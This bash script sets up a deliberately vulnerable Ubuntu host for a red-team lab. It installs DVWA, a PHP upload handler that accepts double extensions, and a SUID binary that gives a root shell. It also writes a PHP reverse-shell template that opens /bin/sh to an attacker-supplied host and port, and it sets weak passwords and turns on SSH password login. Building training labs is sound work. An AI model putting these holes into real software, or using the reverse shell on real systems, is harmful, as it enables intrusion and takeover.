#!/bin/bash
# ubuntu_setup.sh - creates a single vulnerable Ubuntu host for red-team lab
# Tested on Ubuntu 20.04/22.04
set -euo pipefail

echo "Updating packages..."
apt update -y
DEBIAN_FRONTEND=noninteractive apt install -y apache2 php php-mysql libapache2-mod-php \
    mariadb-server mariadb-client git gcc make net-tools wget unzip python3-pip

# Enable PHP short tags and increase upload limits (helpful for file upload testing)
echo "Configuring PHP / Apache..."
PHP_INI="/etc/php/$(php -r 'echo PHP_MAJOR_VERSION.\".\".PHP_MINOR_VERSION;')/apache2/php.ini"
# backup php.ini
cp -n "$PHP_INI" "${PHP_INI}.bak"
# tweak upload & short_open_tag
sed -i "s/upload_max_filesize = .*/upload_max_filesize = 20M/" "$PHP_INI"
sed -i "s/post_max_size = .*/post_max_size = 25M/" "$PHP_INI"
sed -i "s/;short_open_tag = .*/short_open_tag = On/" "$PHP_INI" || true

a2enmod rewrite

# Setup MariaDB - create db for DVWA
echo "Securing MariaDB (minimal for lab)..."
service mysql start
mysql <<SQL
ALTER USER 'root'@'localhost' IDENTIFIED BY 'RootToor!';
FLUSH PRIVILEGES;
CREATE DATABASE dvwa;
CREATE USER 'dvwa'@'localhost' IDENTIFIED BY 'dvwa_pass';
GRANT ALL PRIVILEGES ON dvwa.* TO 'dvwa'@'localhost';
FLUSH PRIVILEGES;
SQL

# Install DVWA
cd /var/www/html
if [ ! -d dvwa ]; then
  git clone https://github.com/ethicalhack3r/DVWA.git dvwa
  chown -R www-data:www-data dvwa
fi

# Configure DVWA (simple)
cd dvwa/config
cp config.inc.php.dist config.inc.php
sed -i "s/^\(\s*\)\$DB_USER\s*=.*/\1\$DB_USER = 'dvwa';/" config.inc.php
sed -i "s/^\(\s*\)\$DB_PASSWORD\s*=.*/\1\$DB_PASSWORD = 'dvwa_pass';/" config.inc.php
sed -i "s/^\(\s*\)\$DB_SERVER\s*=.*/\1\$DB_SERVER = '127.0.0.1';/" config.inc.php

# Create DVWA DB schema
cd /var/www/html/dvwa/resources
php /var/www/html/dvwa/setup.php --create-db || true

# Create custom vulnerable file upload app
mkdir -p /var/www/html/upload
cat > /var/www/html/upload/index.php <<'PHP'
<?php
// intentionally insecure upload handler: allows double extensions (e.g., shell.php.jpg)
if (\$_SERVER['REQUEST_METHOD'] === 'POST' && isset(\$_FILES['file'])) {
    \$f = \$_FILES['file'];
    \$name = basename(\$f['name']);
    // naive allowed extension check: reads last component only
    \$allowed = ['jpg','png','gif','txt','php.jpg','php.png','php.gif'];
    \$ext = pathinfo(\$name, PATHINFO_EXTENSION);
    if (in_array(strtolower(\$ext), \$allowed)) {
        \$target = __DIR__.'/uploads/'.\$name;
        if (!is_dir(__DIR__.'/uploads')) mkdir(__DIR__.'/uploads', 0777, true);
        move_uploaded_file(\$f['tmp_name'], \$target);
        echo "Uploaded as: uploads/".htmlspecialchars(\$name);
    } else {
        echo "Rejected - bad extension: ".htmlspecialchars(\$ext);
    }
    exit;
}
?>
<!doctype html>
<html><body>
<h2>Upload (vulnerable)</h2>
<form method="post" enctype="multipart/form-data">
 <input type="file" name="file"/><br/><br/>
 <input type="submit" value="Upload"/>
</form>
</body></html>
PHP

chown -R www-data:www-data /var/www/html/upload
chmod -R 755 /var/www/html/upload

# Create simple PHP reverse-shell template to be used by students
mkdir -p /root/lab-scripts
cat > /root/lab-scripts/php-reverse.php <<'PHP'
<?php
// quick reverse-shell template (students will edit LHOST/LPORT)
set_time_limit (0);
\$ip = 'LHOST';
\$port = LPORT;
\$sock=fsockopen(\$ip,\$port);
\$proc=proc_open('/bin/sh', array(0=>array('socket',\$sock,'r'),1=>array('socket',\$sock,'w'),2=>array('socket',\$sock,'w')), \$pipes);
?>
PHP

# Create SUID toy (educational - provides root shell)
cat > /usr/local/src/vuln_suid.c <<'C'
#include <stdlib.h>
int main() {
    setuid(0);
    setgid(0);
    system("/bin/sh");
    return 0;
}
C
gcc /usr/local/src/vuln_suid.c -o /usr/local/bin/vuln_suid
chown root:root /usr/local/bin/vuln_suid
chmod 4755 /usr/local/bin/vuln_suid

# Create weak user and flags
useradd -m -s /bin/bash bankuser || true
echo "bankuser:Bank@123" | chpasswd

echo "FLAG{user_flag_1}" > /home/bankuser/user_flag.txt
chown bankuser:bankuser /home/bankuser/user_flag.txt
chmod 600 /home/bankuser/user_flag.txt

echo "FLAG{root_flag_2}" > /root/root_flag.txt
chmod 600 /root/root_flag.txt

# Allow SSH password auth (so students can test harvested creds)
sed -i "s/^#PasswordAuthentication .*/PasswordAuthentication yes/" /etc/ssh/sshd_config || true
sed -i "s/^PasswordAuthentication no/PasswordAuthentication yes/" /etc/ssh/sshd_config || true
systemctl restart sshd

# Firewall: open http and ssh (optional; lab networks often left open)
ufw allow 22/tcp || true
ufw allow 80/tcp || true
ufw --force enable || true

# Ownership and permissions of www
chown -R www-data:www-data /var/www/html
chmod -R 755 /var/www/html

echo "Setup complete!"
echo "DVWA URL: http://<ubuntu-ip>/dvwa/"
echo "Vulnerable upload: http://<ubuntu-ip>/upload/"
echo "bankuser creds: bankuser:Bank@123"
echo "SUID toy: /usr/local/bin/vuln_suid"
echo "user flag: /home/bankuser/user_flag.txt"
echo "root flag: /root/root_flag.txt"
echo ""
echo "NOTE: Remove this VM or revert snapshot after lab. Do not expose to production network."
